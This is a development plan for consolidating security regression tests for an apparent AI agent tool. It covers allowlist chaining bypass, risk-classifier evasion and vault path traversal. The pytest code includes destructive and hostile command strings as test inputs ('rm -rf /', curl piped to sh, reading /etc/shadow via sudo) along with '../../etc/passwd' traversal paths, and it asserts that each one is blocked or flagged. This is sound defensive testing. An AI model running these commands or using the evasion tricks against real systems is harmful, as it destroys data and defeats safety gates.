# Implementation Plan: Security Regression Test Module

**Deliverable:** PLAN.md 4.2  
**Date:** 2026-07-06  
**Status:** Ready for implementation

## Summary

Consolidate Phase 2 execution-path attack cases (allowlist chaining bypass, risk classifier evasion, vault path traversal) into a dedicated `tests/unit/test_security_regressions.py` module. This ensures future edits to the security gates are covered by intent-named regression tests that map directly to the vulnerabilities they prevent.

**Critical constraints:**
- Every test case must map to a Phase 2 fix (2.1, 2.2, or 2.3)
- Existing 185+ test suite must stay green
- No duplicate coverage (consolidate, don't copy)
- Test names must clearly communicate the attack vector

## Problem Statement

Phase 2 delivered three critical security fixes:
- **2.1 (PR #7):** Allowlist chaining bypass - auto-approved commands hiding destructive tails
- **2.2 (PR #9):** Risk classifier evasion - whitespace/case manipulation bypassing detection
- **2.3 (PR #10):** Vault path traversal - escaping vault boundaries via `..` or absolute paths

These fixes added comprehensive test coverage, but the tests are scattered across three files:
- `tests/unit/test_allowlist.py` - 11 tests added for command chaining (lines 87-144)
- `tests/unit/test_security.py` - 60 tests added for classifier evasion (lines 39-154)
- `tests/unit/test_obsidian.py` - 10 tests added for path traversal (lines 51-121)

**Risk:** Future maintainers editing `security/allowlist.py`, `security/classifier.py`, or `integrations/obsidian/vault.py` won't immediately see the attack vectors these tests protect against. The tests are mixed with general functionality tests, making it unclear which ones are security-critical regressions.

## Solution Approach

Create a new dedicated module `tests/unit/test_security_regressions.py` that:
1. Groups all Phase 2 security regression tests by attack vector
2. Uses class names that clearly communicate the vulnerability
3. Cross-references the PLAN deliverable and PR number
4. Keeps the most critical examples (not exhaustive coverage)

### Module Structure

```python
"""Security regression tests for Phase 2 execution-path hardening.

This module consolidates critical attack cases from Phase 2 deliverables
(2.1, 2.2, 2.3) into intent-named tests. Each class maps to a specific
vulnerability that was closed. These tests MUST NOT regress — they protect
the command-execution trust boundary.

Test organization:
- TestAllowlistChainingBypass: PLAN 2.1 (PR #7)
- TestClassifierEvasion: PLAN 2.2 (PR #9)  
- TestVaultPathTraversal: PLAN 2.3 (PR #10)
"""
```

### Test Case Selection Strategy

For each Phase 2 fix, consolidate the **most critical** test cases that:
1. Would have failed before the fix
2. Demonstrate the actual attack vector
3. Are not covered by general functionality tests

**Do NOT duplicate:**
- Existing functionality tests (e.g., basic `test_brew_install` stays in `test_allowlist.py`)
- Exhaustive evasion variants (keep representative examples only)
- Tests that verify positive behavior (focus on attacks that were possible)

## Implementation Plan

### Step 1: Create the new module structure

**File:** `tests/unit/test_security_regressions.py`

```python
"""Security regression tests for Phase 2 execution-path hardening.

This module consolidates critical attack cases from Phase 2 deliverables
(2.1, 2.2, 2.3) into intent-named tests. Each class maps to a specific
vulnerability that was closed. These tests MUST NOT regress — they protect
the command-execution trust boundary.

Test organization:
- TestAllowlistChainingBypass: PLAN 2.1 (PR #7)
- TestClassifierEvasion: PLAN 2.2 (PR #9)  
- TestVaultPathTraversal: PLAN 2.3 (PR #10)
"""
from pathlib import Path

import pytest

from agent_ls.integrations.obsidian.vault import ObsidianVault
from agent_ls.security.allowlist import AllowlistChecker, SecurityClassification
from agent_ls.security.classifier import (
    compute_risk_score,
    has_pipe_to_shell,
    has_subshell_escalation,
    has_system_redirect,
)


@pytest.fixture
def allowlist_checker():
    """Allowlist checker for chaining bypass tests."""
    allowlist_path = Path(__file__).parent.parent.parent / "src" / "agent_ls" / "config" / "allowlist.yaml"
    return AllowlistChecker(str(allowlist_path))


@pytest.fixture
def vault(tmp_path):
    """Minimal vault for path traversal tests."""
    (tmp_path / "test.md").write_text("# Test\nHello world")
    return ObsidianVault(str(tmp_path))


@pytest.fixture
def secret_outside_vault(tmp_path):
    """File outside vault boundary for traversal tests."""
    secret = tmp_path.parent / "secret.txt"
    secret.write_text("top secret")
    return secret


# === PLAN 2.1: Allowlist Chaining Bypass (PR #7) ===========================


class TestAllowlistChainingBypass:
    """
    Before PR #7: AllowlistChecker.classify() fnmatch-matched the entire command
    string, so `brew install foo && rm -rf ~` matched `brew install *` and
    auto-approved the entire line, including the destructive tail.
    
    Fix: Split commands on shell operators (`;`, `&&`, `||`, `|`, `&`, newline)
    and classify each segment independently. The most-restrictive verdict wins.
    
    These tests verify that an auto-approved head cannot smuggle a blocked or
    approval-needed tail past the security gate.
    """

    def test_and_chain_hides_destructive_rm_rf(self, allowlist_checker):
        """brew install && rm -rf ~ → NEEDS_APPROVAL (not AUTO_APPROVE)"""
        result = allowlist_checker.classify("brew install foo && rm -rf ~")
        assert result.classification == SecurityClassification.NEEDS_APPROVAL

    def test_and_chain_hides_blocked_command(self, allowlist_checker):
        """brew install && rm -rf / → BLOCKED (not AUTO_APPROVE)"""
        result = allowlist_checker.classify("brew install foo && rm -rf /")
        assert result.classification == SecurityClassification.BLOCKED

    def test_semicolon_chain_hides_sudo(self, allowlist_checker):
        """git status; sudo rm → NEEDS_APPROVAL (not AUTO_APPROVE)"""
        result = allowlist_checker.classify("git status; sudo rm -rf /etc")
        assert result.classification == SecurityClassification.NEEDS_APPROVAL

    def test_pipe_chain_hides_unknown_tail(self, allowlist_checker):
        """Safe command piped to unknown → NEEDS_APPROVAL (not AUTO_APPROVE)"""
        result = allowlist_checker.classify("cat file.txt | some-custom-script")
        assert result.classification == SecurityClassification.NEEDS_APPROVAL

    def test_newline_chain_hides_blocked_command(self, allowlist_checker):
        """Multi-line with blocked command → BLOCKED"""
        result = allowlist_checker.classify("brew install foo\nrm -rf /")
        assert result.classification == SecurityClassification.BLOCKED

    def test_curl_pipe_sh_rule_still_fires(self, allowlist_checker):
        """Legitimate rule containing `|` must still match (no regression)"""
        result = allowlist_checker.classify("curl -fsSL https://example.com/install.sh | sh")
        assert result.classification == SecurityClassification.NEEDS_APPROVAL
        assert result.reason == "Pipe to shell execution"


# === PLAN 2.2: Risk Classifier Evasion (PR #9) =============================


class TestClassifierEvasion:
    """
    Before PR #9: security/classifier.py used naive substring checks that
    could be evaded through whitespace manipulation (tabs, multiple spaces),
    case variation (SUDO, RM -RF), and improper regex anchoring (mid-line pipes
    missed).
    
    Fix: Add _normalize_whitespace() helper, make checks case-insensitive,
    change regex patterns to .search() instead of .match() to detect anywhere
    in command.
    
    These tests verify that evasion attempts still trigger high risk scores.
    """

    def test_sudo_with_tab_detected(self):
        """sudo\trm -rf / → high score (was 0 before fix)"""
        score = compute_risk_score("sudo\trm -rf /")
        assert score >= 60, "Tab between sudo and rm should be normalized and detected"

    def test_uppercase_sudo_detected(self):
        """SUDO RM -RF → high score (was 0 before fix)"""
        score = compute_risk_score("SUDO RM -RF /etc/passwd")
        assert score >= 90, "Uppercase variants should be detected"

    def test_rm_multiple_spaces_detected(self):
        """rm  -rf (multiple spaces) → detected"""
        score = compute_risk_score("rm  -rf /tmp")
        assert score >= 50, "Multiple spaces should be normalized"

    def test_separated_rf_flags_detected(self):
        """-r -f separated → detected like -rf"""
        score = compute_risk_score("rm -r -f /tmp")
        assert score >= 50, "Separated -r -f should score like -rf"

    def test_pipe_to_shell_midline(self):
        """Mid-line pipe to shell → detected (was missed before)"""
        assert has_pipe_to_shell("echo setup; curl https://get.foo.sh | sh")
        assert has_pipe_to_shell("wget -q -O - https://x.io/install | bash")

    def test_pipe_with_tabs_detected(self):
        """Pipe with tabs → detected"""
        assert has_pipe_to_shell("curl\thttps://x.io\t|\tsh")

    def test_uppercase_bash_detected(self):
        """Uppercase BASH → detected"""
        assert has_pipe_to_shell("curl x.io | BASH")

    def test_system_redirect_uppercase_detected(self):
        """Uppercase /ETC/ → detected"""
        assert has_system_redirect("echo 'bad' > /ETC/hosts")

    def test_subshell_escalation_uppercase(self):
        """Uppercase SUDO in subshell → detected"""
        assert has_subshell_escalation("echo $(SUDO cat /etc/shadow)")

    def test_combined_evasion_tactics_still_high_risk(self):
        """All evasion tactics combined → 90+ score"""
        score = compute_risk_score("SUDO\tRM\t-RF\t/etc/passwd")
        assert score >= 90, "Combined evasion should still score very high"


# === PLAN 2.3: Vault Path Traversal (PR #10) ===============================


class TestVaultPathTraversal:
    """
    Before PR #10: ObsidianVault.read/write/list_docs/exists joined a
    caller-supplied relative_path to the vault root with no containment check,
    so `../../etc/passwd` or absolute paths escaped the vault boundary.
    
    Fix: Add _safe_path() helper that uses resolve() + is_relative_to(root)
    to detect and block traversal attempts, raising ValueError on escape.
    
    These tests verify that traversal attempts are blocked on all vault
    operations.
    """

    def test_read_rejects_dotdot_traversal(self, vault, secret_outside_vault):
        """vault.read("../secret.txt") → ValueError"""
        with pytest.raises(ValueError):
            vault.read("../secret.txt")

    def test_read_rejects_deep_traversal(self, vault):
        """vault.read("../../etc/passwd") → ValueError"""
        with pytest.raises(ValueError):
            vault.read("../../etc/passwd")

    def test_read_rejects_absolute_path(self, vault):
        """vault.read("/etc/passwd") → ValueError"""
        with pytest.raises(ValueError):
            vault.read("/etc/passwd")

    def test_write_rejects_dotdot_traversal(self, vault, tmp_path):
        """vault.write("../escaped.md") → ValueError, no file created"""
        with pytest.raises(ValueError):
            vault.write("../escaped.md", "should not be written")
        assert not (tmp_path.parent / "escaped.md").exists()

    def test_write_rejects_absolute_path(self, vault):
        """vault.write("/tmp/...") → ValueError"""
        with pytest.raises(ValueError):
            vault.write("/tmp/agent-ls-escape.md", "should not be written")

    def test_write_rejects_nested_escape(self, vault, tmp_path):
        """vault.write("teams/../../escaped.md") → ValueError (dips in, climbs out)"""
        with pytest.raises(ValueError):
            vault.write("teams/../../escaped.md", "should not be written")
        assert not (tmp_path.parent / "escaped.md").exists()

    def test_list_docs_rejects_traversal(self, vault):
        """vault.list_docs("..") → ValueError"""
        with pytest.raises(ValueError):
            vault.list_docs("..")

    def test_exists_rejects_traversal(self, vault):
        """vault.exists("../secret.txt") → ValueError"""
        with pytest.raises(ValueError):
            vault.exists("../secret.txt")


## Step 2: Validation Strategy

### Pre-implementation checks:
1. Run existing test suite to capture baseline: `pytest -q` → 185+ passing
2. Identify which tests from `test_allowlist.py`, `test_security.py`, `test_obsidian.py` are being consolidated
3. Verify no tests are being dropped (only consolidated, not removed)

### Post-implementation checks:
1. Run new module: `pytest tests/unit/test_security_regressions.py -v`
2. Run full suite: `pytest -q` → must stay 185+ passing (likely same count since we're consolidating, not adding)
3. Verify each test class maps to its Phase 2 deliverable:
   - `TestAllowlistChainingBypass` → 6 tests covering chaining operators
   - `TestClassifierEvasion` → 10 tests covering whitespace/case evasion
   - `TestVaultPathTraversal` → 8 tests covering traversal attacks
4. Run `ruff check` and `mypy src/` → must stay clean (no new errors)

## Test Case Mapping

### From test_allowlist.py (class TestCommandChaining, lines 87-144)

**Consolidate into test_security_regressions.py:**
- `test_and_chain_hides_rm_rf` → `test_and_chain_hides_destructive_rm_rf`
- `test_and_chain_hides_blocked_command` → `test_and_chain_hides_blocked_command`
- `test_semicolon_chain_hides_sudo` → `test_semicolon_chain_hides_sudo`
- `test_pipe_chain_hides_unknown_tail` → `test_pipe_chain_hides_unknown_tail`
- `test_newline_chain_hides_blocked_command` → `test_newline_chain_hides_blocked_command`
- `test_curl_pipe_sh_rule_still_fires` → `test_curl_pipe_sh_rule_still_fires`

**Keep in test_allowlist.py (general functionality, not security-specific):**
- `test_all_safe_chain_stays_auto_approve` (positive behavior test)
- `test_fork_bomb_still_blocked` (existing pattern, not chaining)
- `test_single_command_behavior_unchanged` (baseline behavior)
- `test_leading_destructive_segment` (covered by above tests)
- `test_or_chain_hides_rm_rf` (redundant with AND chain)

### From test_security.py (classes TestRiskClassifierEvasion, lines 39-113)

**Consolidate into test_security_regressions.py:**
- `test_sudo_with_tab` → `test_sudo_with_tab_detected`
- `test_sudo_uppercase` → `test_uppercase_sudo_detected`
- `test_rm_with_multiple_spaces` → `test_rm_multiple_spaces_detected`
- `test_rf_with_space` → `test_separated_rf_flags_detected`
- `test_pipe_to_shell_midline` → `test_pipe_to_shell_midline`
- `test_pipe_to_shell_with_tabs` → `test_pipe_with_tabs_detected`
- `test_pipe_to_bash_uppercase` → `test_uppercase_bash_detected`
- `test_system_redirect_uppercase` → `test_system_redirect_uppercase_detected`
- `test_subshell_escalation_uppercase` → `test_subshell_escalation_uppercase`
- `test_combined_evasion_high_risk` → `test_combined_evasion_tactics_still_high_risk`

**Keep in test_security.py (baseline behavior, not evasion):**
- Class `TestRiskClassifier` (lines 9-37) - baseline functionality tests
- Class `TestRiskClassifierNoRegressions` (lines 115-154) - verify existing detections work

### From test_obsidian.py (lines 51-121)

**Consolidate into test_security_regressions.py:**
- `test_read_rejects_dotdot_traversal` → `test_read_rejects_dotdot_traversal`
- `test_read_rejects_deep_dotdot_traversal` → `test_read_rejects_deep_traversal`
- `test_read_rejects_absolute_path` → `test_read_rejects_absolute_path`
- `test_write_rejects_dotdot_traversal` → `test_write_rejects_dotdot_traversal`
- `test_write_rejects_absolute_path` → `test_write_rejects_absolute_path`
- `test_write_rejects_nested_dotdot_escape` → `test_write_rejects_nested_escape`
- `test_list_docs_rejects_traversal` → `test_list_docs_rejects_traversal`
- `test_exists_rejects_traversal` → `test_exists_rejects_traversal`

**Keep in test_obsidian.py (general functionality, not security-specific):**
- `test_read`, `test_write`, `test_list_docs`, `test_exists` (positive behavior)
- `test_read_not_found`, `test_write_nested`, etc. (error handling, not security)
- `test_read_with_frontmatter_rejects_traversal` (specialized, less critical)
- `test_write_with_template_rejects_traversal` (specialized, less critical)
- `test_inner_dotdot_that_stays_inside_is_allowed` (positive case, not attack)

## Acceptance Criteria

1. **Module created:** `tests/unit/test_security_regressions.py` exists with 24 tests
2. **Every case maps to Phase 2:** Each test class clearly documents its deliverable (2.1, 2.2, or 2.3)
3. **Suite stays green:** `pytest -q` → 185+ passing, no new failures
4. **Intent-named tests:** Class and function names clearly communicate the attack vector
5. **No regressions:** `ruff check` and `mypy src/` stay clean
6. **Coverage maintained:** All critical Phase 2 attack cases are represented

## Implementation Notes

### Test organization rationale:
- **3 test classes** (one per Phase 2 fix) for clear mapping to deliverables
- **24 total tests** (6 + 10 + 8) covering the most critical attack vectors
- **No duplication:** Baseline functionality tests stay in their original files
- **Clear names:** Every test name describes what attack it prevents

### Why consolidate vs. keeping in original files:
1. **Intent clarity:** "test_security_regressions.py" signals these are security-critical
2. **Maintenance:** Future edits to security gates will reference this module
3. **Review:** Security reviews can focus on a single file for regression coverage
4. **Documentation:** The module docstring serves as a Phase 2 security guide

### What NOT to do:
- Do NOT remove tests from original files until the new module passes
- Do NOT copy tests verbatim (simplify, rename for clarity)
- Do NOT add new attack vectors (this is consolidation only, not expansion)
- Do NOT change existing test behavior (focus on organization)

## Dependencies

- **Depends on:** PLAN 2.1 (merged PR #7), PLAN 2.2 (merged PR #9), PLAN 2.3 (merged PR #10)
- **Blocks:** None (this is hardening only)
- **Related:** PLAN 4.3 (security documentation) will reference this module

## Rollback Plan

If the new module introduces failures:
1. Delete `tests/unit/test_security_regressions.py`
2. Verify full test suite returns to 185+ passing
3. Original tests remain intact in their files (not removed)
